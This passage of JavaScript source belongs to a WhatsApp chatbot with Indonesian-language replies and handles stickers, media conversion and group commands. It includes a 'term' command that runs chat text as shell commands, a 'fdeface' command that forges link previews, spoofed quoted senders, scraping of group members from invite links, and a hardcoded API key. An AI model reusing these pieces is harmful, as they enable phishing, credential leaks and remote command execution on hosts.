	exec(`ffmpeg -i ${masa} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(masa)
if (err) return setReply('Error!')
buffer453 = fs.readFileSync(ran)
xdev.sendMessage(from, buffer453, audio, { mimetype: "audio/mp4", ptt: true, quoted: dev})
fs.unlinkSync(ran)})
break

            
                      
                      
                      
                      
                      
                      
      
            
            
            
     

      
       
      
        case 'listrespon':{
          let txt = `List Respon\nTotal : ${commandsDB.length}\n\n`
          for (let i = 0; i < commandsDB.length; i++){
          txt += `❏ Key : ${commandsDB[i].pesan}\n`
          }
          setReply(txt)
          }
        break
        
        
    case 'reverse':
            if (!isQuotedVideo) return setReply('Reply videonya!')
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return setReply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
    

       case 'sourcecode': 
       case 'sc': 
       case 'src':
              xdev.sendMessage(from, `Bot ini menggunakan sc dari youtube https://youtu.be/mYHDDIx3qEI`, text, {quoted : dev, detecLinks : true})
              break

case 'style':
				  if(!q) return setReply('Masukkan teks!')
         setReply(mess.wait)
			axios.get(`https://kocakz.herokuapp.com/api/random/text/fancytext?text=${body.slice(7)}`).then((res) => {
      let hasil = `*Hasil* :\n${res.data.result}`;
      xdev.sendMessage(from, hasil, MessageType.text, { quoted: dev});
    })
break
case 'pastebin':
if(!q) return setReply(`Contoh ${prefix}pastebin Extream`)
yamete = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${q}`, {method: 'get'})
                   xdev.sendMessage(from, `${yamete.result}`, text, {quoted: setQuoted})
                     break
                     
     


                
    case 'anime':
     if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            setReply(mess.wait)
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'NIH'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
            
    case 'kontak':
    if(!q) return setReply(`penggunaan ${prefix}kontak nomor| nama`)
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return setReply('Invalid phone number');
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${PhoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            xdev.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break    
            
            case 'getname':
            if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return setReply('Reply targetnya!')
            if(isGroup) {
        var ambl = dev.message.extendedTextMessage.contextInfo.participant
const sname = xdev.contacts[ambl] != undefined ? xdev.contacts[ambl].notify = undefined ? PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[ambl].notify || xdev.contacts[ambl].vname : PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international')
setReply(sname)
}else {
const yahu = xdev.contacts[from] != undefined ? xdev.contacts[from].notify = undefined ? PhoneNumber('+' + from.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[from].notify || xdev.contacts[from].vname : PhoneNumber('+' + from.replace('@s.whatsapp.net', '')).getNumber('international')
setReply(yahu)
}
break
            
            
    case 'take':
    case 'colong':
    		if (!isQuotedSticker) return setReply(`Reply stickernya denya ${prefix}take Wawan|suka makan`)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		    media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ahuh = args.join(' ').split('|')
            satu = ahuh[0] !== '' ? ahuh[0] : `EXTREAM`
            dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
            require('./lib/fetcher.js').createExif(satu, dua)
			require('./lib/fetcher.js').modStick(media, xdev, dev, from)
			break
			
	case 'stikerwm':
	case 'stickerwm':
    case 'swm':
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            if (isMedia && !dev.message.videoMessage || isQuotedImage ) {
            const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
             media = await xdev.downloadAndSaveMediaMessage(encmedia)
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            xdev.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: dev })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            xdev.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: dev })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out) 
            } else if ((isMedia && dev.message.videoMessage.seconds < 11 || isQuotedVideo && dev.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            const media = await xdev.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            xdev.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: dev })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            xdev.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: dev })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out)       
            } else {
            setReply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
            }
            break
    
    case 'fdeface':
            ge = args.join('')           
            var pe = ge.split("|")[0];
            var pen = ge.split("|")[1];
            var pn = ge.split("|")[2];
            var be = ge.split("|")[3];
            const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`
            if (args.length < 1) return reply (fde)
             dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
             tipes = await xdev.downloadAndSaveMediaMessage(dipes)        
             bufer = fs.readFileSync(tipes)
             desct = `${pn}`
             title = `${pen}`
             url = `${pe}`
             buu = `https://${be}`
    		var anus = {
        	detectLinks: false
    		}
    		var mat = await xdev.generateLinkPreview(url)
    		mat.title = title;
    		mat.description = desct;
    		mat.jpegThumbnail = bufer;
   			mat.canonicalUrl = buu; 
    		xdev.sendMessage(from, mat, MessageType.extendedText, anus)
           fs.unlinkSync(tipes)
            break

		
			
				
			        
				
				     
				
				
				
				
				
				
				
				case 'delerror':
				case 'delror':
					if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
					try {
					 listerror.splice(q, 1)
					fs.writeFileSync('./database/listerror.json', JSON.stringify(listerror))
					await xdev.sendMessage(from, `Sukses menghapus ${q} di daftar error`, text)
					} catch (err){
						console.log(err)
						setReply('eror kak')
					}
					break
				
				
				
				case 'addmusik':
				{
				
				if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedAudio) return setReply('Reply musik')
				if (!q) return setReply('Nama musiknya apa')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				musiknye.push(q)
				fs.writeFileSync(`./temp/musik/${q}.mp3`, delb)
				fs.writeFileSync('./temp/music.json', JSON.stringify(musiknye))
				await xdev.sendMessage(from, `Sukses Menambahkan musik\nCek dengan cara ${prefix}musik`, MessageType.text, { quoted: dev})
				}
				break
				
				
				
				
				case 'delmusik':
					if (!isOwner) return onlyOwner() 
					try {
				await setReply(mess.wait)
					 wanu = audionye.indexOf(q)
					 musiknye.splice(wanu, 1)
					 fs.unlinkSync(`./temp/musik/${q}.mp3`)
					fs.writeFileSync('./temp/music.json', JSON.stringify(musiknye))
					await xdev.sendMessage(from, `Sukses menghapus musik ${q}`, text)
					} catch (err){
						console.log(err)
						setReply('eror kak')
					}
					break
				
				
				
				
				
				case 'delvn':
					if (!isOwner) return onlyOwner() 
					try {
					 wanu = audionye.indexOf(q)
					 audionye.splice(wanu, 1)
					fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
				    fs.unlinkSync(`./temp/audio/${q}.mp3`)
					xdev.sendMessage(from, 'Sukses', text)
					} catch (err){
						console.log(err)
						setReply('eror kak')
					}
					break
					
					
					
				case 'restart':
if (!isOwner && !dev.key.fromMe) return setReply("Khusus Owner")
await setReply(`Succes restarting`)
exec(`node main`)
break
	
			
				
				case 'liststik':
				teks = '*Sticker list :*\n\n'
				for (let awokwkwk of setiker) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${setiker.length}*`
				xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": setiker } })
				break
				
				case 'listimg':
				teks = '*Image list :*\n\n'
				for (let awokwkwk of imagenye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${imagenye.length}*`
				xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": setiker } })
				break
				
				case 'listvid':
				  case 'listvideo':
				teks = '*List Video :*\n\n'
				for (let awokwkwk of videonye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${videonye.length}* `
				xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": imagenye } })
				break
				
				case 'listvn':
			case 'vnlist':
				teks = '*List Vn:*\n\n'
				for (let awokwkwk of audionye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total ada : ${audionye.length}*`
				teks += `\n\n*Untuk mengambil vn silakan ketik nama vn*`
				xdev.sendMessage(from, teks.trim(), extendedText, { quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': thumb }}}, contextInfo: forward })
				break
				
				
				
				
				
				
				
		    case 'listmusik':
			case 'musiklist':
			case 'musik':
				teks = '*List Musik:*\n\n'
				for (let awokwkwk of musiknye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total ada : ${musiknye.length}*`
				teks += `\n\n*Untuk mengambil musik silakan ketik nama musik*`
				
				
    const rows2 = [{
        "title": 'Hello Mother F',
        "rowId": '0'
    }, {
        "title": 'ASADE',
        "rowId": '0'
    },{
        "title": 'Sugar Crash',
        "rowId": '0'
    }, {
        "title": 'Ring Ring You',
        "rowId": '0'
    },{
        "title": 'DJ CAMPURAN',
        "rowId": '0'
    },{
        "title": 'DJ OPUS',
        "rowId": '0'
    }];
    const sections2 = [{
        title: 'Pilih salah satu',
        rows: rows2
    }];
    const listt2 = {
        buttonText: 'SELECT HERE',
        title: `*Cek musik di sini*`,
        description: `Bisa di ketik atau di klik disini`,
        footerText: `Fitur ini masih uji coba`,
        sections: sections2,
        listType: 1
    };
    xdev.sendMessage(from, teks.trim(), extendedText, { quoted: setQuoted, contextInfo: forward })
    xdev.sendMessage(from, listt2, MessageType.listMessage, {
        contextInfo: {
            "mentionedJid": [sender]
        }
    })
break
				
				
 



	



	
			
	
                   
             
					
        
    
    

case 'exif':
case 'setexif':
                    if (!isOwner && !dev.key.fromMe) return onlyOwner()
					const exifff = `${args.join(' ')}`
					const namaPack = exifff.split('|')[0]
					const authorPack = exifff.split('|')[1]
					exif.create(namaPack, authorPack)
					await setReply('Done gan')
				break


case 'sticker':
					case 'stiker':
					case 's':
						if (isMedia && !dev.message.videoMessage || isQuotedImage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
							const media = await xdev.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										setReply(err)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return setReply(mess.error.api)
											xdev.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: dev})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && dev.message.videoMessage.fileLength < 10000000 || isQuotedVideo && dev.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
							const media = await xdev.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							setReply(mess.wait)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										setReply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return setReply(error)
											xdev.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: dev})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						}  else {
							setReply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
						}
						break


case 'nobg':
if ((isMedia || isQuotedImage)) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
                        const media = await xdev.downloadAndSaveMediaMessage(encmedia)
                        ranw = getRandom('.webp')
                        ranp = getRandom('.png')
                        setReply(mess.wait)
                        keyrmbg = 'veNFDqX5fbrv81ZwWS2PgR1d'
                        await removeBackgroundFromImageFile({ path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp }).then(res => {
                            fs.unlinkSync(media)
                            let bufferir9vn5 = Buffer.from(res.base64img, 'base64')
                            fs.writeFileSync(ranp, bufferir9vn5, (err) => {
                                if (err) return setReply('Gagal, Terjadi kesalahan, silahkan coba beberapa saat lagi.')
                            })
                            exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
                                fs.unlinkSync(ranp)
                                if (err) return setReply(`emror bang ${err}`)
                                xdev.sendMessage(from, fs.readFileSync(ranw), sticker, { quoted: dev })
                                    fs.unlinkSync(ranw)
                                })
                            }) 
                            }
break



            case 'addcmd': 
			case 'setcmd':{
                  if (!dev.key.fromMe && !isOwner) return setReply(mess.owner)
                  if (isQuotedSticker) {
                  if (!q) return setReply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
                  var kodenya = dev.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
                   if (checkSCommand(kodenya, _scommand) === true) return setReply(`Command tersebut sudah ada`)
                  addCmd(kodenya, q)
                  setReply("_Success_")
                  } else {
                  setReply('tag stickenya')
                  }
                  }
            break
            
            
			
            case 'toptt':
             if (isQuotedAudio){
					setReply(mess.wait)
					encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await xdev.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return setReply('Gagal mengkonversi audio ke ptt')
						topt = fs.readFileSync(ran)
						 xdev.sendMessage(from, topt, audio, {mimetype: 'audio/mp4', quoted: dev, ptt:true})
						fs.unlinkSync(ran)
						})
						}
					break
            
   
            
            case 'delcmd':{
                  if (!dev.key.fromMe && !isOwner) return setReply(mess.owner)
                  if (!isQuotedSticker) return setReply(`Penggunaan : ${command} tagsticker`)
                  var kodenya = dev.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
                  if (checkSCommand(kodenya, _scommand) === false) return setReply(`Command tersebut tidak ada`)
                  _scommand.splice(getCommandPosition(kodenya), 1)
                  fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
                  setReply("_Success_")
                  }
            break
            case 'listcmd':
let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
let cemde = [];
for (let i of _scommand) {
cemde.push(i.id)
teksnyee += `\n\n*•> ID :* ${i.id}\n*•> Cmd* : ${i.chats}`
}
mentions(teksnyee, cemde, true)
break
    case 'toimg':
			if (!isQuotedSticker) return setReply('Reply stickernya')
			setReply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await xdev.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return setReply('Yah gagal, coba ulangi ^_^')
			buffer = fs.readFileSync(ran)
			xdev.sendMessage(from, buffer, image)
			fs.unlinkSync(ran)
			})
			break
	
	
			
			
	
	
	case 'semoji':
			if (!q) return setReply('emojinya?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[4].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
    
    
	
            
 case 'gimage':
case 'googleimage':
case 'image':
if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 1) return setReply('Apa Yang Mau Dicari?')
setReply(mess.wait)
teks = args.join(' ')
res = await gis(teks, google)
function google(error, result){
if (error){ return setReply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: dev, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
limitAdd(senderNumber, user)
break



case 'listonline':
             if (!isGroup) return setReply(`*Only group*`)
             try {
             let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
             let online = [...Object.keys(xdev.chats.get(ido).presences), xdev.user.jid]
             xdev.sendMessage(from, '*List Online:*\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: dev, contextInfo: { mentionedJid: online }})
             } catch (e) {
             setReply(`${e}`)
}
             break
case "listonline2": 
        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
        try {
          let online = [...Object.keys(xdev.chats.get(id).presences),xdev.user.jid]
          
          xdev.reply(m.chat, "「 L I S T   O N L I N E  」\n" + online.map((v) => "├ @" + v.replace(/@.+/, "")).join`\n` + "\n", m,
            {
              contextInfo: { mentionedJid: online },
            }
          );
        } catch (e) {
          m.reply(e);
        }
        break;

case 'listgc':
case 'gclist':
case 'listgroup':
                case 'listgrup':
                case 'listgrop':
                case 'gruplist':
                case 'groplist':
                case 'grouplist':
  const txs = xdev.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`- ${xdev.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n\n`
  setReply(txs)
  break
            
            
            
           
           
           
            
            
 	
    
     
     
    case 'brainly':
    if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
			if (args.length < 1) return setReply('Pertanyaan apa')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '❉───────────────────────❉\n'
			for (let Y of res.data) {
			teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
			}
			xdev.sendMessage(from, teks, text,{quoted:dev,detectLinks: true})                     
            })        
      limitAdd(senderNumber, user)
			break
			
			
    
            
            
    

  
	case 'term':
    if (!dev.key.fromMe && !isOwner) return setReply(mess.owner)
			if (!q) return setReply(mess.wrongFormat)
			exec(q, (err, stdout) => {
			if (err) return setReply(`SELF-BOT:~ ${err}`)
			if (stdout) {
			setReply(stdout)
			}
			})
		    break 
		
		
    case 'join':    
    try{
                          if (!isOwner)return setReply(`Perintah ini Khusus owner`) 
                          if (args.length < 1) return setReply(`Kirim perintah *${prefix}join* link grup`)
                          if(!isGroup){
                          if (!isUrl(args[0]) && !args[0].includes('chat.whatsapp.com')) return setReply(mess.error.Iv)
                          let code = args[0].replace('https://chat.whatsapp.com/', '')
                          xdev.acceptInvite(code)
                         
                          setReply(`_Succses Join Group!_`)
                          } else {
                            if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return setReply('*The link is invalid Tod*')
                            link = args[0].replace('https://chat.whatsapp.com/','')
                            fak = xdev.query({ json: ['action', 'invite', link],
                            expect200: true })
                           
                            setReply('*Successfully Entered Group*')
                            }
                           }catch (err){
						console.log(err)
						return setReply("Link Error")
					}
                           break
                 
                 
                case 'ovo':
                  xdev.sendMessage(from, fs.readFileSync('./kode qr/ovo.jpg'), image, {quoted: setQuoted})
                    break 
                case 'gopay':
                  xdev.sendMessage(from, fs.readFileSync('./kode qr/gopay.jpg'), image, {quoted: setQuoted})
                    break 
                     case 'dana':
                  xdev.sendMessage(from, fs.readFileSync('./kode qr/dana.jpg'), image, {quoted: setQuoted})
                    break 
                 
    

            
    case 'runtime':
    case 'test':
    
            run = process.uptime() 
            teks = runtime(run)            
          //  await xdev.sendMessage(from, `Bot aktif selama ${teks.split(":")[0]} Jam - ${teks.split(":")[1]} Menit - ${teks.split(":")[2]} Detik`, text, {quoted: setQuoted})
          teksnya =`Bot aktif selama ${teks}`
            setReply(teksnya)
            break  
      
      
	case 'speed':
	case 'ping':
			const timestamp = speed();
			exec(`neofetch --stdout`, (error, stdout, stderr) => {
			const child = stdout.toString('utf-8')
			const teks = child.replace(/Memory:/, "Ram:")
			const pingnya = `${teks}Speed: ${latensi.toFixed(4)} Second`
			xdev.sendMessage(from, pingnya, text, {quoted: setQuoted})
			})
			break  
			
			
    case 'totag':
    if (!dev.key.fromMe && !isOwner) return setReply(mess.owner)
            if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !dev.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4',
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !dev.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          setReply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    
    case 'tourl2':
            if ((isMedia && !dev.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            owgi = await xdev.downloadMediaMessage(boij)
            res = await upload(owgi)
            setReply(res)
            } else {
            setReply('kirim/reply gambar/video')
            }
            break	
    
    
    case 'inspect':
    if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            try{
            setReply(mess.wait)
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return setReply(mess.Iv)
            if (!q) return setReply('masukan link wa')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return setReply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await xdev.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
*Id desc* : ${descId}
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
             }
             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
